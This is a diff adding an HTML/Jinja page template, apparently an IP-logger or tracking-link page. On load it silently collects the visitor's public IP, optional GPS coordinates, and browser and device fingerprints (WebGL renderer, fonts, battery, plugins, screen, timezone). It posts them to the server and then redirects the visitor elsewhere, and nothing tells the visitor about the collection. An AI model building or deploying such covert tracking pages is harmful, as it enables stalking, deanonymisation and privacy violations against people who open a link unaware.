@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Information</title>
+    <script>
+        const attemptGeolocation = {{ attempt_geolocation | tojson }};
+    </script>
+</head>
+<body>
+    <script>
+        function getGeolocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        callback({ latitude, longitude });
+                    },
+                    (error) => {
+                        let errorMessage = "";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "User denied the request for Geolocation.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information is unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "The request to get user location timed out.";
+                                break;
+                            case error.UNKNOWN_ERROR:
+                                errorMessage = "An unknown error occurred.";
+                                break;
+                        }
+                        callback(null, errorMessage);
+                    }
+                );
+            } else {
+                callback(null, "Geolocation is not supported by this browser.");
+            }
+        }
+
+        function fetchIPAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    return "Unknown";
+                });
+        }
+
+        function detectPlatform() {
+            const userAgent = navigator.userAgent;
+            if (/android/i.test(userAgent)) return "Android";
+            if (/iPhone/i.test(userAgent)) return "iPhone";
+            if (/iPad/i.test(userAgent)) return "iPad";
+            if (/Macintosh/i.test(userAgent)) return "Mac OS";
+            if (/Windows/i.test(userAgent)) return "Windows";
+            if (/Linux/i.test(userAgent)) return "Linux";
+            return "Unknown Platform";
+        }
+
+        function detectAudioCapabilities() {
+            const audio = document.createElement('audio');
+            const audioCodecs = [
+                'audio/mpeg',
+                'audio/ogg; codecs="vorbis"',
+                'audio/wav',
+                'audio/mp4; codecs="aac"',
+            ];
+            return audioCodecs.filter(codec => audio.canPlayType(codec) !== '');
+        }
+
+        function detectFonts() {
+            const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Impact"];
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const availableFonts = fontList.filter(font => {
+                context.font = `72px ${font}`;
+                return context.measureText("abcdefghijklmnopqrstuvwxyz").width > 0;
+            });
+            return availableFonts;
+        }
+
+        function getBatteryStatus() {
+            return navigator.getBattery().then(battery => ({
+                level: battery.level,
+                charging: battery.charging
+            }));
+        }
+
+        function getWebGLFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + " " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Not Available";
+        }
+
+
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = "Unknown";
+            let browserVersion = "Unknown";
+
+            if (userAgent.includes("Firefox")) {
+                browserName = "Firefox";
+                browserVersion = userAgent.match(/Firefox\/(\d+\.\d+)/)[1];
+            } else if (userAgent.includes("Chrome")) {
+                browserName = "Chrome";
+                browserVersion = userAgent.match(/Chrome\/(\d+\.\d+)/)[1];
+            } else if (userAgent.includes("Safari")) {
+                browserName = "Safari";
+                browserVersion = userAgent.match(/Version\/(\d+\.\d+)/)[1];
+            } else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) {
+                browserName = "Internet Explorer";
+                browserVersion = userAgent.match(/(MSIE |rv:)(\d+\.\d+)/)[2];
+            }
+
+            return { browserName, browserVersion };
+        }
+
+
+function isDST(date) {
+    const january = new Date(date.getFullYear(), 0, 1).getTimezoneOffset();
+    const july = new Date(date.getFullYear(), 6, 1).getTimezoneOffset();
+    const current = date.getTimezoneOffset();
+
+    // If the offset in January is not the same as in July, then we have DST
+    return current < Math.max(january, july);
+}
+
+
+async function fetchUserInformation(attemptGeolocation = false) {
+    let latitude = 0.0,
+        longitude = 0.0,
+        publicIP = null;
+
+    const getLocation = () => {
+        return new Promise((resolve) => {
+            getGeolocation((location, errorMessage) => {
+                if (location) {
+                    latitude = location.latitude;
+                    longitude = location.longitude;
+                    resolve();
+                } else {
+                    console.error('Error getting location:', errorMessage);
+                    resolve(); // Resolve even if there's an error
+                }
+            });
+        });
+    };
+
+    const geolocationPromise = attemptGeolocation ? getLocation() : Promise.resolve();
+
+    try {
+        await geolocationPromise; // Wait for geolocation promise to resolve
+        publicIP = await fetchIPAddress(); // Await the IP address fetch
+
+        const { browserName, browserVersion } = getBrowserInfo();
+        const timeOnPage = Math.round(performance.now() / 1000); // Time in seconds
+        const referrer = document.referrer || "Direct Access";
+        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+
+        const deviceMemory = navigator.deviceMemory || "N/A"; // GB of RAM
+        const featuresSupported = {
+            serviceWorker: 'serviceWorker' in navigator,
+            indexedDB: 'indexedDB' in window,
+            webRTC: !!(window.RTCPeerConnection),
+        };
+
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const effectiveType = connection ? connection.effectiveType : "N/A";
+
+        const userInfo = {
+            latitude,
+            longitude,
+            publicIP,
+            userAgent: navigator.userAgent,
+            platform: detectPlatform(),
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            viewportWidth: window.innerWidth,
+            viewportHeight: window.innerHeight,
+            isOnline: navigator.onLine ? "Online" : "Offline",
+            language: navigator.language || navigator.userLanguage,
+            languagePreferences: navigator.languages.join(', '),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+            doNotTrack: navigator.doNotTrack === "1" ? "Yes" : "No",
+            connectionType: navigator.connection?.effectiveType || "N/A",
+            browserName,
+            browserVersion,
+            timeOnPage,
+            referrer,
+            deviceType,
+            installedPlugins: Array.from(navigator.plugins).map(plugin => plugin.name),
+            availableFonts: detectFonts(),
+            screenOrientation: screen.orientation ? screen.orientation.type : "N/A",
+            audioCapabilities: detectAudioCapabilities(),
+            touchSupport: 'ontouchstart' in window,
+            hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+            sessionStorageSupported: typeof(Storage) !== "undefined",
+            webGLFingerprint: getWebGLFingerprint(),
+            isDST: isDST(new Date()),
+            featuresSupported: featuresSupported,
+            deviceMemory,
+            batteryStatus: await getBatteryStatus(), // Await the battery status fetch
+            effectiveType: effectiveType,
+        };
+
+        const response = await fetch('/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(userInfo)
+        });
+
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        const data = await response.json();
+        window.location.href = data.redirect;
+
+    } catch (error) {
+        console.error('Error sending data to server:', error);
+    }
+}
+
+        // Call fetchUserInformation with the desired geolocation flag when the page loads
+        window.onload = function() {
+            fetchUserInformation(attemptGeolocation);
+        };
+    </script>
+</body>
+</html>
